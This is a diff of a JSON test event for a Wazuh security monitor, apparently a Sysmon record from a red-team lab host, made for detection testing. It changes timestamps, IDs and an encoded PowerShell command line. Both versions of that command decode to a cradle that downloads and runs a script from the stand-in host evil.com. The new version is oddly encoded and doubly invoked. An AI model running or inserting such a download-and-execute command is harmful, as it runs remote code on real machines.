@@ -1,5 +1,5 @@
 {
-  "timestamp": "2026-10-25T06:16:08.000Z",
+  "timestamp": "2026-10-25T08:07:46.000Z",
   "rule": {
     "level": 0,
     "description": "Test event"
@@ -12,7 +12,7 @@
   "manager": {
     "name": "wazuh-manager"
   },
-  "id": "df8e7473-3881-408c-bae1-e9c2145d2174",
+  "id": "9eb3c75c-a471-43b6-a5f6-173f207de9cb",
   "data": {
     "win": {
       "system": {
@@ -20,12 +20,12 @@
         "channel": "Microsoft-Windows-Sysmon/Operational",
         "computer": "WS01.corp.purpleforge.local",
         "providerName": "Microsoft-Windows-Sysmon",
-        "systemTime": "2026-10-25T06:16:08.000Z",
-        "eventRecordID": "88517"
+        "systemTime": "2026-10-25T08:07:46.000Z",
+        "eventRecordID": "99705"
       },
       "eventdata": {
         "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "commandLine": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAnACkA",
+        "commandLine": "powershell.exe -EncodedCommand SW52b2tlLUV4cHJlc3Npb24gKElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2V2aWwuY29tL3NoZWxsJykp",
         "parentImage": "C:\\Windows\\explorer.exe",
         "user": "CORP\\redteam"
       }
